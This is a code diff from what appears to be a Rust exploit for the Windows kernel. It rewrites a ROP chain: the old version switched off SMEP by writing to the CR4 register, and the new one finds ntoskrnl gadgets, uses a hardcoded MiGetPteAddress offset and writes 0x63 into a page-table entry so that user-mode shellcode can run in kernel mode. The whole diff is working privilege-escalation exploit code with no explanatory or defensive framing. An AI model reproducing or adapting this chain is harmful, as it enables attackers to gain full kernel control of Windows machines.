@@ -22,28 +22,46 @@ fn build_smep_disable_rop_chain(
     base_offset: usize,
     shellcode_address: u64,
 ) -> Vec<u8> {
-    let ntoskrnl_handle = load_library_no_resolve(krnl_name).expect("[-] Failed to load ntoskrnl");
+    let mi_get_pte_address = kernel_base + 0x288b28u64;
+    println!("[+] MiGetPteAddress address: 0x{mi_get_pte_address:x}");
 
+    let ntoskrnl_handle = load_library_no_resolve(krnl_name).expect("[-] Failed to load ntoskrnl");
     let sections =
         get_executable_sections(ntoskrnl_handle).expect("[-] Failed to get executable sections");
 
     let pop_rcx_ret_address = find_gadget_offset(&sections, &[0x59, 0xC3], kernel_base)
         .expect("[-] Failed to find pop rcx ; ret gadget");
-
     println!("[+] Found pop rcx ; ret gadget at 0x{pop_rcx_ret_address:x}");
 
-    let mov_cr4_rcx_ret_address =
-        find_gadget_offset(&sections, &[0x0F, 0x22, 0xE1, 0xC3], kernel_base)
-            .expect("[-] Failed to find mov cr4, rcx ; ret gadget");
+    let pop_rax_ret_address = find_gadget_offset(&sections, &[0x58, 0xC3], kernel_base)
+        .expect("[-] Failed to find pop rax ; ret gadget");
+    println!("[+] Found pop rax ; ret gadget at 0x{pop_rax_ret_address:x}");
 
-    println!("[+] Found mov cr4, rcx ; ret gadget at 0x{mov_cr4_rcx_ret_address:x}");
+    let push_rax_ret_address = find_gadget_offset(&sections, &[0x36, 0x50, 0xC3], kernel_base)
+        .expect("[-] Failed to find push rax ; ret gadget");
+    println!("[+] Found push rax ; ret gadget at 0x{push_rax_ret_address:x}");
+
+    let mov_deref_rax_rcx_ret_address =
+        find_gadget_offset(&sections, &[0x48, 0x89, 0x08, 0xC3], kernel_base)
+            .expect("[-] Failed to find mov qword [rax], rcx ; ret gadget");
+    println!("[+] Found mov qword [rax], rcx ; ret gadget at 0x{mov_deref_rax_rcx_ret_address:x}");
+
+    let wbinvd_ret_address = find_gadget_offset(&sections, &[0x0F, 0x09, 0xC3], kernel_base)
+        .expect("[-] Failed to find wbinvd ; ret gadget");
+    println!("[+] Found wbinvd ; ret gadget at 0x{wbinvd_ret_address:x}");
 
     let rop_chain = create_rop_chain!(
         base_offset,
         pop_rcx_ret_address,
-        0xA50EF8_u64,
-        mov_cr4_rcx_ret_address,
-        shellcode_address
+        shellcode_address,
+        pop_rax_ret_address,
+        mi_get_pte_address,
+        push_rax_ret_address,
+        pop_rcx_ret_address,
+        0x63u64,
+        mov_deref_rax_rcx_ret_address,
+        wbinvd_ret_address,
+        shellcode_address,
     );
 
     rop_chain
